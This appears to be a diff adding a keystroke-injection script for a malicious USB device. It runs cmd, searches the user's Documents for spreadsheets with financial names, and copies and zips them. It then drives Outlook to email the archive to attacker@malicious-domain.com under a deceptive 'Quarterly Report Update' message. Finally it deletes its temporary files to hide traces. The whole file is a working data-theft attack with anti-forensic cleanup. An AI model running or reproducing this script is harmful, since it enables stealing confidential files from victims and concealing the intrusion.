@@ -1,0 +1,86 @@
+// Stage 1: Reconnaissance - Check for sensitive files
+GuiR
+Delay 500
+Print cmd
+Press KEY_ENTER
+Delay 1000
+
+// Create a directory listing of potential sensitive files
+PrintLine dir /s /b "C:\Users\%username%\Documents\*financial*.xlsx" > C:\temp\filelist.txt
+Delay 2000
+
+// Stage 2: Data Collection
+PrintLine mkdir C:\temp\exfil
+Delay 500
+PrintLine for /f "delims=" %i in (C:\temp\filelist.txt) do copy "%i" C:\temp\exfil\
+Delay 3000
+
+// Stage 3: Data Compression
+PrintLine powershell Compress-Archive -Path C:\temp\exfil\* -DestinationPath C:\temp\financial_data.zip -Force
+Delay 5000
+
+// Stage 4: Data Exfiltration via Outlook
+// Close CMD and open Outlook
+PrintLine exit
+Delay 500
+GuiR
+Delay 500
+Print outlook
+Press KEY_ENTER
+Delay 3000
+
+// Create new email
+Press KEY_LEFT_CTRL
+Print n
+Release
+Delay 1000
+
+// Add attacker's email address
+Print attacker@malicious-domain.com
+Delay 500
+Press KEY_TAB
+Delay 300
+
+// Add innocuous-looking subject
+Print Quarterly Report Update
+Delay 300
+Press KEY_TAB
+Delay 300
+
+// Add deceptive body text
+Print As requested, here is the updated quarterly financial report. Please review at your earliest convenience.
+Delay 500
+Press KEY_TAB
+Delay 300
+
+// Attach the compressed data
+Press KEY_LEFT_ALT
+Print h
+Release
+Delay 500
+Print af
+Delay 1000
+Print C:\temp\financial_data.zip
+Delay 500
+Press KEY_ENTER
+Delay 2000
+
+// Send the email
+Press KEY_LEFT_ALT
+Print s
+Release
+Delay 1000
+
+// Stage 5: Cleanup to hide traces
+GuiR
+Delay 500
+Print cmd
+Press KEY_ENTER
+Delay 1000
+PrintLine del /q /f C:\temp\financial_data.zip
+Delay 500
+PrintLine rmdir /s /q C:\temp\exfil
+Delay 500
+PrintLine del /q /f C:\temp\filelist.txt
+Delay 500
+PrintLine exit
